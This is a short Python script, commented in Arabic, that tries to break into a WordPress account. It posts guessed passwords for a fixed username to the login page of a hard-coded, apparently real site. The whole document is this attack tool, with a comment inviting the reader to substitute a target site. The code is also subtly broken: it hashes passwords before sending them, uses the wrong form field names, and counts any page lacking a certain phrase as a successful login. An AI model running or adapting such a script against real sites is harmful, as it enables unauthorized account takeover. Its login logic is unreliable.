import requests
import hashlib

def try_password(url, username, password):
  """
  يحاول تسجيل الدخول إلى موقع ووردبريس باستخدام اسم المستخدم وكلمة المرور المُحددين.
  """
  hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
  data = {
    "username": username,
    "password": hashed_password,
    "wp-submit": "تسجيل الدخول",
    "redirect_to": url
  }
  response = requests.post(url + "/wp-login.php", data=data)
  if "incorrect password" not in response.text:
    print(f"كلمة المرور الصحيحة هي: {password}")
    return True
  else:
    return False

def main():
  """
  يُشغّل السكربت ويحاول اختراق كلمة المرور باستخدام كلمات المرور المُحددة.
  """
  url = "https://dev-learnwithtawfik.pantheonsite.io"  # استبدل ب URL موقع ووردبريس المُستهدف
  username = "123"  # استبدل باسم المستخدم المُستخدم
  passwords = ["pwd", "LZR^Dw4qjtX*^QBGdB"]  # قائمة بكلمات المرور المُحتملة

  for password in passwords:
    if try_password(url, username, password):
      break

if __name__ == "__main__":
  main()
